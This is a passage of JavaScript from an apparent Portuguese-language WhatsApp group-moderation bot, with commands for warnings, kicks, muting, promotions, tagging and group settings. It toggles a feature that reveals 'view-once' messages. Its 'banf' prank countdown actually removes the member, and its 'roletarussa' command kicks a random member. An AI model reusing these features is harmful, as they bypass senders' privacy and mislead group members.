if(isX9VisuUnica) return reply(' 𝙊 𝙧𝙚𝙘𝙪𝙧𝙨𝙤 𝙙𝙚 𝙧𝙚𝙫𝙚𝙡𝙖𝙧 𝙫𝙞𝙨𝙪 𝙪́𝙣𝙞𝙘𝙖 𝙟𝙖́ 𝙚𝙨𝙩𝙖́ 𝙖𝙩𝙞𝙫𝙖𝙙𝙤 👩🏻‍💻')
dataGp[0].visuUnica = true
setGp(dataGp)
setTimeout(() => {reagir(from, `👩🏻‍💻`)}, 50)
reply('𝘼𝙩𝙞𝙫𝙤𝙪 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤 𝙤 𝙧𝙚𝙘𝙪𝙧𝙨𝙤 𝙙𝙚 𝙧𝙚𝙫𝙚𝙡𝙖𝙧 𝙫𝙞𝙨𝙪 𝙪́𝙣𝙞𝙘𝙖 𝙣𝙚𝙨𝙩𝙚 𝙜𝙧𝙪𝙥𝙤 ✅')
} else if(Number(args[0]) === 0) {
if(!isX9VisuUnica) return reply('𝙊 𝙧𝙚𝙘𝙪𝙧𝙨𝙤 𝙙𝙚 𝙧𝙚𝙫𝙚𝙡𝙖𝙧 𝙫𝙞𝙨𝙪 𝙪́𝙣𝙞𝙘𝙖 𝙟𝙖́ 𝙚𝙨𝙩𝙖́ 𝙙𝙚𝙨𝙖𝙩𝙞𝙫𝙖𝙙𝙤 👩🏻‍💻.')
dataGp[0].visuUnica = false
setGp(dataGp)
setTimeout(() => {reagir(from, `❌`)}, 50)
reply(' 𝘿𝙚𝙨𝙖𝙩𝙞𝙫𝙤𝙪 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤 𝙤 𝙧𝙚𝙘𝙪𝙧𝙨𝙤 𝙙𝙚 𝙧𝙚𝙫𝙚𝙡𝙖𝙧 𝙫𝙞𝙨𝙪 𝙪́𝙣𝙞𝙘𝙖 𝙣𝙚𝙨𝙩𝙚 𝙜𝙧𝙪𝙥𝙤 ✅')
} else {
reply(' 1 𝙥𝙖𝙧𝙖 𝙖𝙩𝙞𝙫𝙖𝙧, 0 𝙥𝙖𝙧𝙖 𝙙𝙚𝙨𝙖𝙩𝙞𝙫𝙖𝙧 👩🏻‍💻')
}
break

case 'advertir':
case 'adv':
case 'adverter': 
if(!isGroup) return reply(reply.msg.grupo)
if(!isAdmins) return reply(reply.msg.adm)
if(menc_os2 == numeroBot) return reply("❕𝙉𝙖̃𝙤 𝙥𝙤𝙙𝙚 𝙖𝙙𝙫𝙚𝙧𝙩𝙞𝙧 𝙤 𝙥𝙧𝙤́𝙥𝙧𝙞𝙤 𝙗𝙤𝙩 𝙨𝙚𝙪 𝙗𝙖𝙞𝙩𝙤𝙡𝙖 😑");
if(menc_os2 == donoNumber) return reply("❕𝙉𝙖̃𝙤 𝙥𝙤𝙙𝙚 𝙖𝙙𝙫𝙚𝙧𝙩𝙞𝙧 𝙤 𝙥𝙧𝙤́𝙥𝙧𝙞𝙤 𝙙𝙤𝙣𝙤 𝙙𝙤 𝙗𝙤𝙩 😑");
if(groupAdmins.includes(menc_os2)) return reply("❕𝙉𝙖̃𝙤 é 𝙥𝙤𝙨𝙨𝙞́𝙫𝙚𝙡 𝙖𝙙𝙫𝙚𝙧𝙩𝙞𝙧 𝙖𝙙𝙢𝙞𝙣𝙨𝙩𝙧𝙖𝙙𝙤𝙧 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 𝙨𝙚𝙪 𝙡𝙤𝙪𝙘𝙤(𝙖) .");
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("❕𝙉𝙖̃𝙤 𝙩𝙚𝙢 𝙘𝙤𝙢𝙤 𝙖𝙙𝙫𝙚𝙧𝙩𝙞𝙧 𝙪𝙢 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤 𝙦𝙪𝙚 𝙣𝙖̃𝙤 𝙨𝙚 𝙚𝙣𝙘𝙤𝙣𝙩𝙧𝙖 𝙢𝙖𝙞𝙨 𝙣𝙤 𝙜𝙧𝙪𝙥𝙤.")
reagir(from, "👩🏻‍💻")
await sleep(1000)
ADVT.push(menc_os2); setGp(dataGp)  
setTimeout(async() => {
var dfqn = ADVT.filter(x => x == menc_os2).length
var dfntxt = `𝙊𝙡𝙖́ @${menc_os2.split("@")[0]} - 𝗩𝗼𝗰𝗲 𝗿𝗲𝗰𝗲𝗯𝗲𝘂 𝘂𝗺𝗮 𝗮𝗱𝘃𝗲𝗿𝘁𝗲̂𝗻𝗰𝗶𝗮 𝗽𝗼𝗿 𝗺𝗼𝘁𝗶𝘃𝗼𝘀 𝗷𝘂𝘀𝘁𝗼 ${dfqn}/3, 𝙩𝙤𝙢𝙚 𝙘𝙪𝙞𝙙𝙖𝙙𝙤 𝙘𝙤𝙢 3 𝙖𝙙𝙫𝙚𝙧𝙩𝙚̂𝙣𝙘𝙞𝙖𝙨 𝗿𝗲𝘀𝘂𝗹𝘁𝗮𝗿𝗮́ 𝗲𝗺 𝘀𝘂𝗮 𝗿𝗲𝗺𝗼𝗰̧𝗮̃𝗼 𝗱𝗼 𝗴𝗿𝘂𝗽𝗼!`
if(!dfntxt.includes("3/3")) {
if(!JSON.stringify(ADVT).includes(sender)) {
await sleep(1500); mentions(dfntxt, [menc_os2])
} else if(dfqn == 2) {
await sleep(1500); mentions(dfntxt, [menc_os2])
}} else {amy.sendMessage(from, {text: `👋🏻 𝘼𝙙𝙚𝙪𝙨 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤: [ @${menc_os2.split("@")[0]} ] - 𝙑𝙤𝙘𝙚̂ 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙤𝙪 3 𝙖𝙙𝙫𝙚𝙧𝙩𝙚̂𝙣𝙘𝙞𝙖𝙨, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙖 𝙖𝙙𝙢𝙞𝙣𝙞𝙨𝙩𝙧𝙖𝙘̧𝙖̃𝙤 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 𝙥𝙖𝙧𝙖 𝙩𝙚𝙧 𝙣𝙤𝙘̧𝙖̃𝙤 𝙙𝙤 𝙦𝙪𝙚 𝙛𝙤𝙞 𝙤𝙘𝙤𝙧𝙧𝙞𝙙𝙤.`, mentions: [menc_os2]})
await sleep(1500)
amy.groupParticipantsUpdate(from, [menc_os2], "remove")
var i = ADVT.indexOf(menc_os2); ADVT.splice(i, 3); setGp(dataGp)}}, 3000)
break

case 'rmadv': case 'rmvadv':
if(!isGroup) return reply(reply.msg.grupo)
if(!isAdmins) return reply(reply.msg.adm)
if(!menc_os2) return reply("𝙑𝙤𝙘𝙚̂ 𝙚𝙨𝙦𝙪𝙚𝙘𝙚𝙪 𝙙𝙚 𝙢𝙚𝙣𝙘𝙞𝙤𝙣𝙖𝙧 𝙤 𝙖𝙡𝙫𝙤 𝙖𝙥𝙤́𝙨 𝙤 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 🙄")
reagir(from, '🥺')
adv = dataGp[0].advertir.map(i => i).indexOf(menc_os2)
if(adv < 0) return reply("𝙀𝙨𝙩𝙚 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤 𝙣𝙖̃𝙤 𝙘𝙤𝙣𝙩𝙚́𝙢 𝙣𝙚𝙣𝙝𝙪𝙢𝙖 𝙖𝙙𝙫𝙚𝙧𝙩𝙚̂𝙣𝙘𝙞𝙖 𝙣𝙤 𝙜𝙧𝙪𝙥𝙤 👩🏻‍💻")
dataGp[0].advertir.splice(adv, 1)
setGp(dataGp)
reply("𝘼 𝙖𝙙𝙫𝙚𝙧𝙩𝙚̂𝙣𝙘𝙞𝙖 𝙙𝙤 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤 𝙣𝙚𝙨𝙩𝙚 𝙜𝙧𝙪𝙥𝙤 𝙛𝙤𝙞 𝙧𝙚𝙩𝙞𝙧𝙖𝙙𝙖 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤 !")
break

case 'ban': case 'kick':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('𝙈𝙖𝙧𝙦𝙪𝙚 𝙖 𝙢𝙚𝙣𝙨𝙖𝙜𝙚𝙢 𝙙𝙖 𝙥𝙚𝙨𝙨𝙤𝙖 𝙦𝙪𝙚 𝙙𝙚𝙨𝙚𝙟𝙖 𝙗𝙖𝙣𝙞𝙧 🚫')
if(info.message.extendedTextMessage.contextInfo.participant !== null && info.message.extendedTextMessage.contextInfo.participant != undefined && info.message.extendedTextMessage.contextInfo.participant !== "") {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
let responseb = await amy.groupParticipantsUpdate(from, [mentioned], 'remove')
if (responseb[0].status === "200") return reply(`𝙐𝙨𝙪𝙖𝙧𝙞𝙤 𝙧𝙚𝙢𝙤𝙫𝙞𝙙𝙤 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝗼`)
else if (responseb[0].status === "406") return reply('𝙉𝙖𝙤 𝙥𝙤𝙨𝙨𝙤 𝙧𝙚𝙢𝙤𝙫𝙚𝙧 𝙚𝙨𝙩𝙖 𝙥𝙚𝙨𝙨𝙤𝙖,𝙥𝙤𝙞𝙨 𝙚𝙡𝙚 𝙚 𝙤 𝙘𝙧𝙞𝙖𝙙𝙤𝙧 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 ')
else if (responseb[0].status === "404") return reply('𝙀𝙨𝙩𝙚 𝙪𝙨𝙪𝙖𝙧𝙞𝙤 𝙟𝙖 𝙛𝙤𝙞 𝙧𝙚𝙢𝙤𝙫𝙞𝙙𝙤 𝙤𝙪 𝙨𝙖𝙞𝙪 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 ❕')
else return reply('𝙩𝙚𝙣𝙩𝙚 𝙣𝙤𝙫𝙖𝙢𝙚𝙣𝙩𝙚 𝙥𝙤𝙧 𝙛𝙖𝙫𝙤𝙧 ❕')
} else if (info.message.extendedTextMessage.contextInfo.mentionedJid != null && info.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(mentioned.length > 1) {
if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return reply(`𝙑𝙖𝙞 𝙖𝙧𝙦𝙪𝙞𝙫𝙖𝙧 𝙤 𝙜𝙧𝙪𝙥𝙤 𝙢𝙚𝙨𝙢𝙤 𝙥𝙖𝙧𝙘𝙚𝙞𝙧𝙤(𝙖) ?`)
sexocomrato = 0
for (let banned of mentioned) {
await sleep(100)
let responseb2 = await amy.groupParticipantsUpdate(from, [banned], 'remove')
if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
}
return reply(``)
} else {
let responseb3 = await amy.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
if (responseb3[0].status === "200") return reply(`𝙐𝙨𝙪𝙖𝙧𝙞𝙤 𝙧𝙚𝙢𝙤𝙫𝙞𝙙𝙤 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤👩🏻‍💻`)
else if (responseb3[0].status === "406") return reply('𝙉𝙖𝙤 𝙥𝙤𝙨𝙨𝙤 𝙧𝙚𝙢𝙤𝙫𝙚𝙧 𝙚𝙨𝙩𝙖 𝙥𝙚𝙨𝙨𝙤𝙖,𝙥𝙤𝙞𝙨 𝙚𝙡𝙚 𝙚 𝙤 𝙘𝙧𝙞𝙖𝙙𝙤𝙧 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 ')
else if (responseb3[0].status === "404") return reply(' 𝙀𝙨𝙩𝙚 𝙪𝙨𝙪𝙖𝙧𝙞𝙤 𝙟𝙖́ 𝙛𝙤𝙞 𝙧𝙚𝙢𝙤𝙫𝙞𝙙𝙤 𝙤𝙪 𝙨𝙖𝙞𝙪 ❕')
else return reply('𝙏𝙚𝙣𝙩𝙚 𝙣𝙤𝙫𝙖𝙢𝙚𝙣𝙩𝙚 𝙥𝙤𝙧 𝙛𝙖𝙫𝙤𝙧 ❕')
}
}
break;

case 'banf':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
reagir(from, "🥺")
await sleep(1000)
Test = [
`Eliminando membro @${menc_os2.split("@")[0]} em 10...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 9...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 8...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 7...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 6...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 5...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 4...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 3...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 2...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 1...`,
`👻 Buuuuh @${menc_os2.split("@")[0]}, se assustou trouxa 🤣`
]
let { key } = await amy.sendMessage(from, {text: `Iniciando a contagem regressiva para seu banimento @${menc_os2.split("@")[0]}...`, mentions: [menc_os2]}, {quoted: info}) 
await sleep(2000)
for (let i = 0; i < Test.length; i++) {
await amy.sendMessage(from, {text: Test[i], edit: key , mentions: [menc_os2]}, {quoted: info});
await sleep (12000)
amy.groupParticipantsUpdate(from, [menc_os2], 'remove')
}
break;
case 'roletarussa':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
jds = []
 A2 = groupMembers
 B2 = groupMembers
 TAMBOR = ["𝙣𝙖 𝙥𝙚𝙧𝙣𝙖.","𝙣𝙖 𝙘𝙖𝙗𝙚𝙘̧𝙖.","𝙣𝙤 𝙥𝙚𝙨𝙘𝙤𝙘̧𝙤.","𝙣𝙤 𝙥𝙚𝙞𝙩𝙤.","𝙣𝙤 𝙤𝙡𝙝𝙤.","𝙣𝙤 𝙚𝙨𝙩𝙤̂𝙢𝙖𝙜𝙤.","𝙣𝙖 𝙗𝙤𝙘𝙖.","𝙣𝙤 𝙯𝙤𝙫𝙤","𝙣𝙖 𝙩𝙚𝙨𝙩𝙖.","𝙣𝙤 𝙗𝙧𝙖𝙘̧𝙤."]
  C2 = A2[Math.floor(Math.random() * A2.length)]
if(C2 === sender || C2 === numeroBot+"@s.whatsapp.net") {
return reply(`𝙀𝙨𝙘𝙤𝙡𝙝𝙞 @${C2.id.split('@')[0]} 𝙢𝙖𝙨 𝙞𝙣𝙛𝙚𝙡𝙞𝙯𝙢𝙚𝙣𝙩𝙚 𝙘𝙤𝙧𝙧𝙚𝙪 𝙙𝙚 𝙘𝙤𝙫𝙖𝙧𝙙𝙞𝙖 😑 `)
}
 tpa = TAMBOR[Math.floor(Math.random() * (TAMBOR.length))]	 		
 reply(`𝘼 𝙚𝙨𝙘𝙤𝙡𝙝𝙖 𝙚́ 𝙢𝙞𝙣𝙝𝙖! 1 𝙢𝙚𝙢𝙗𝙧𝙤 𝙞𝙧𝙖́ 𝙢𝙤𝙧𝙧𝙚𝙧, 𝙦𝙪𝙚 𝙤𝙨 𝙟𝙤𝙜𝙤𝙨 𝙘𝙤𝙢𝙚𝙘𝙚𝙢 😈`)
 setTimeout( () => {
D1 = ` 𝙌𝙪𝙚 𝙥𝙚𝙣𝙖... 𝙫𝙤𝙘𝙚̂ 𝙣𝙖̃𝙤 𝙨𝙤𝙗𝙧𝙚𝙫𝙞𝙫𝙚𝙪 𝙖𝙤 𝙢𝙚𝙪 𝙟𝙤𝙜𝙤 @${C2.id.split('@')[0]}, 𝙝𝙤𝙧𝙖 𝙙𝙚 𝙚𝙣𝙩𝙚𝙧𝙧𝙖𝙧 𝙤 𝙘𝙖𝙙𝙖́𝙫𝙚𝙧, 𝙞𝙣𝙛𝙚𝙡𝙞𝙯𝙢𝙚𝙣𝙩𝙚 𝙢𝙤𝙧𝙧𝙚𝙪 𝙘𝙤𝙢 𝙩𝙞𝙧𝙤 ${tpa}`             			
mentions(D1, jds, true)
}, 5000)
 jds.push(C2.id)				  
setTimeout( () => {
jds.push(C2.id)
amy.groupParticipantsUpdate(from, [C2.id], "remove")
}, 6000) 
break

case 'nomegp':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (!q) return reply(` `);
amy.groupUpdateSubject(from, `${q}`)
reply('nome gp alterado com sucesso '); 
break;           

case 'descgp':
case 'descriçãogp': 
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (!q) return reply(` `);
amy.groupUpdateDescription(from, `${q}`)
amy.sendMessage(from, {text: ' 𝙎𝙪𝙘𝙚𝙨𝙨𝙤, 𝙫𝙤𝙘𝙚 𝙖𝙡𝙩𝙚𝙧𝙤𝙪 𝙖 𝙙𝙚𝙨𝙘𝙧𝙞𝙘̧𝙖̃𝙤 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 ✅'}, {quoted: info})
break

case 'setfotogp':
case 'fotogp':  
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(!isQuotedImage) return reply(`𝙐𝙨𝙚: ${prefix + command} <𝙈𝙖𝙧𝙦𝙪𝙚 𝙪𝙢𝙖 𝙛𝙤𝙩𝙤>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
amy.updateProfilePicture(from, {url: medipp})
reply(`𝙁𝙤𝙩𝙤 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 𝙖𝙡𝙩𝙚𝙧𝙖𝙙𝙖 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤 ✅`) 
break

case 'rmfotogp': case 'rmfotogroup': {
setTimeout(() => {reagir(from, `👩🏻‍💻`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
reply(`*A foto do grupo foi removida com sucesso ✅*`)
await amy.removeProfilePicture(from)
}
break

case 'ephemeral': case 'msgtemp': { 
setTimeout(() => {reagir(from, `👩🏻‍💻`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (!q) return reply(`USE 1 PARA ATIVAR / 0 PARA DESATIVAR 👩🏻‍💻`)
if (args[0] === '1') {
reply(`✅️ As mensagens temporárias ativada com sucesso.`)
await amy.sendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === '0') {
reply(`❌️ As mensagens temporárias desativada com sucesso.`)
await amy.sendMessage(from, { disappearingMessagesInChat: false })
}
}
break


case 'marcarwa':
reagir(from, "🙇🏻‍♀️")
await sleep(1000)
try {
if(!isGroup) return reply(reply.msg.grupo)
if(!isAdmins) return reply(reply.msg.adm)
if(q.includes(`${prefix}`)) return reply("𝙉𝙖̃𝙤 𝙥𝙤𝙙𝙚 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙧 𝙘𝙤𝙢𝙖𝙣𝙙𝙤𝙨 𝙣𝙚𝙨𝙨𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 👩🏻‍💻")
members_id = []
zeroteks = (args.length > 1) ? body.slice(10).trim() : ''
zeroteks += ''
for (let mem of groupMembers) {
zeroteks += `➢ https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
amy.sendMessage(from, {text: zeroteks}, {quoted: info})
} catch {
reply('𝙀𝙧𝙧𝙤 𝙖𝙤 𝙢𝙚𝙣𝙘𝙞𝙤𝙣𝙖𝙧 𝙤𝙨 𝙢𝙚𝙢𝙗𝙧𝙤𝙨 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤.')
}
break

case 'marcar':
reagir(from, "🙇🏻‍♀️")
await sleep(1000)
{
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
 let metadata = await amy.groupMetadata(from)
let teks = `• 𝙈𝙚𝙣𝙘𝙞𝙤𝙣𝙖𝙣𝙙𝙤 𝙤𝙨 𝙢𝙚𝙢𝙗𝙧𝙤𝙨 𝙘𝙤𝙢𝙪𝙣𝙨 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤. ${!q ? "" : `\n𝙈𝙚𝙣𝙨𝙖𝙜𝙚𝙢: ${q}`}\n\n`
for (let mem of participants) {
teks += `➢ @${mem.id.split('@')[0]}\n`
}
amy.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: info })
}
break


case 'mute': case 'm': case 'mutar':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
textin = args.join(" ")
if(!textin) return reply('❕𝙈𝙖𝙧𝙦𝙪𝙚 𝙤 𝙣𝙪́𝙢𝙚𝙧𝙤 𝙦𝙪𝙚 𝙙𝙚𝙨𝙚𝙟𝙖 𝙢𝙪𝙩𝙖𝙧 👩🏻‍💻')
reagir(from, "🤐")
await sleep(1000)
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(isMuted) {
var ind = GroupsMutedActived.indexOf(from)
for (let _ of mentioned) {
teks = `🔇 𝙐𝙨𝙪𝙖́𝙧𝙞𝙤 𝙢𝙪𝙩𝙖𝙙𝙤: @${_.split('@')[0]}
 𝘼𝙘̧𝙖̃𝙤 𝙙𝙤 𝙖𝙙𝙢: [ ${pushname} ] 👩🏻‍💻`
muted[ind].numbers.push(_)
}
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2))
teks += '\n-\n🤫 𝙊𝙡𝙖 𝙢𝙚𝙢𝙗𝙧𝙤 𝙘𝙖𝙨𝙤 𝙫𝙤𝙘𝙚̂ 𝙙𝙚𝙧 𝙪𝙢 𝙥𝙞𝙪, 𝙫𝙤𝙘𝙚̂ 𝙫𝙖𝙞 𝙨𝙚𝙧 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙙𝙤 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤'
mentions(teks, mentioned, true)
} else {
 const data = {
jid: from,
numbers: mentioned
}
muted.push(data)
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `🔇 𝙐𝙨𝙪𝙖́𝙧𝙞𝙤 𝙢𝙪𝙩𝙖𝙙𝙤:_* @${_.split('@')[0]}
 𝘼𝙘̧𝙖̃𝙤 𝙙𝙤 𝙖𝙙𝙢: [ ${pushname} ] 👩🏻‍💻`
}
teks += '\n-\n*🤫 𝙊𝙡𝙖 𝙢𝙚𝙢𝙗𝙧𝙤 𝙘𝙖𝙨𝙤 𝙫𝙤𝙘𝙚̂ 𝙙𝙚𝙧 𝙪𝙢 𝙥𝙞𝙪, 𝙫𝙤𝙘𝙚̂ 𝙫𝙖𝙞 𝙨𝙚𝙧 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙙𝙤𝙧  𝙙𝙤 𝙜𝙧𝙪𝙥𝙤'
mentions(teks, mentioned, true)
}
break


case 'desmute': case 'unmute': case 'desmutar':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
textin = args.join(" ")
if(!textin) return reply('❕𝙈𝙖𝙧𝙦𝙪𝙚 𝙤 𝙣𝙪́𝙢𝙚𝙧𝙤 𝙦𝙪𝙚 𝙙𝙚𝙨𝙚𝙟𝙖 𝙙𝙚𝙨𝙢𝙪𝙩𝙖𝙧👩🏻‍💻')
reagir(from, "📢")
await sleep(1000)
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
var ind = GroupsMutedActived.indexOf(from)
if(isMuted) {
for(let _ of mentioned) {
if(muted[ind].numbers.indexOf(_) >= 0) {
var rmind = muted[ind].numbers.indexOf(_)
muted[ind].numbers.splice(rmind, 1)
}
}
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `🔊 𝙐𝙨𝙪𝙖́𝙧𝙞𝙤 𝙙𝙚𝙨𝙢𝙪𝙩𝙖𝙙𝙤: @${_.split('@')[0]}
𝘼𝙘̧𝙖̃𝙤 𝙙𝙤 𝙖𝙙𝙢: [ ${pushname} ] 👩🏻‍💻`
}
teks += '\n-\n🤪 𝙖𝙜𝙤𝙧𝙖 𝙫𝙤𝙘𝙚̂ 𝙥𝙤𝙙𝙚 𝙛𝙖𝙡𝙖𝙧 𝙖 𝙫𝙤𝙣𝙩𝙖𝙙𝙚 𝙣𝙤 𝙜𝙧𝙪𝙥𝙤!'
mentions(teks, mentioned, true)
} else {
const data = {
jid: from,
numbers: []
}
muted.push(data)
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `🔊 𝙐𝙨𝙪𝙖́𝙧𝙞𝙤 𝙙𝙚𝙨𝙢𝙪𝙩𝙖𝙙𝙤: @${_.split('@')[0]}
 𝘼𝙘̧𝙖̃𝙤 𝙙𝙤 𝙖𝙙𝙢: [ ${pushname} ] 👩🏻‍💻`
}
teks += '\n-\n🤪 𝘼𝙜𝙤𝙧𝙖 𝙫𝙤𝙘𝙚̂ 𝙥𝙤𝙙𝙚 𝙛𝙖𝙡𝙖𝙧 𝙖 𝙫𝙤𝙣𝙩𝙖𝙙𝙚 𝙣𝙤 𝙜𝙧𝙪𝙥𝙤!'
mentions(teks, mentioned, true)
}
break


case 'promover': case 'promote':
if (!isGroup) return reply(msg.grupo)
if (!isAdmins) return reply(msg.adm)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('𝙑𝙖𝙞 𝙘𝙤𝙡𝙤𝙘𝙖𝙧 𝙤 𝙫𝙚𝙣𝙩𝙤 𝙘𝙤𝙢𝙤 𝙖𝙙𝙢 𝙢𝙚𝙨𝙢𝙤 ?')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
let responsedm = await amy.groupParticipantsUpdate(from, [mentioned], 'promote')
if (responsedm[0].status === "200") return reply('𝙐𝙨𝙪𝙖́𝙧𝙞𝙤 𝙥𝙧𝙤𝙢𝙤𝙫𝙞𝙙𝙤 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤 🥳\n\n𝗔𝗱𝗶𝗺𝗶𝗻𝗶𝘀𝘁𝗿𝗲 𝗰𝗼𝗺 𝘀𝗮𝗯𝗲𝗱𝗼𝗿𝗶𝗮, 𝗼𝘂 𝘀𝗲𝗿𝗮 𝗿𝗲𝗯𝗮𝗶𝘅𝗮𝗱𝗼 👩🏻‍💻')
else if (responsedm[0].status === "404") return reply('𝙀𝙨𝙨𝙚 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤 𝙣𝙖𝙤 𝙚𝙨𝙩𝙖́ 𝙣𝙤 𝙜𝙧𝙪𝙥𝙤 🤔')
else return reply('𝙏𝙚𝙣𝙩𝙚 𝙣𝙤𝙫𝙖𝙢𝙚𝙣𝙩𝙚 𝙥𝙤𝙧 𝙛𝙖𝙫𝙤𝙧')
break


case 'rebaixar': case 'rebaixa':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('𝙈𝙖𝙧𝙦𝙪𝙚 𝙤𝙪 𝙧𝙚𝙨𝙥𝙤𝙣𝙙𝙖 𝙖 𝙢𝙚𝙣𝙨𝙖𝙜𝙚𝙢 𝙙𝙚 𝙦𝙪𝙚𝙢 𝙫𝙤𝙘𝙚̂ 𝙦𝙪𝙚𝙧 𝙩𝙞𝙧𝙖𝙧 𝙙𝙚 𝙖𝙙𝙢𝙞𝙣 ❕')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
let responsepm = await amy.groupParticipantsUpdate(from, [mentioned], 'demote')
if (responsepm[0].status === "406") return reply(`𝙊𝙡𝙖 ${pushname} 𝙣𝙖𝙤 𝙥𝙤𝙨𝙨𝙤 𝙧𝙚𝗯𝗮𝗶𝘅𝗮𝗿 𝙚𝙨𝙩𝗮 𝙥𝙚𝙨𝙨𝙤𝙖, 𝙥𝙤𝙞𝙨 𝙚𝙡𝙚 𝙚 𝙤 𝙘𝙧𝙞𝙖𝙙𝙤𝙧 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 👩🏻‍💻`)
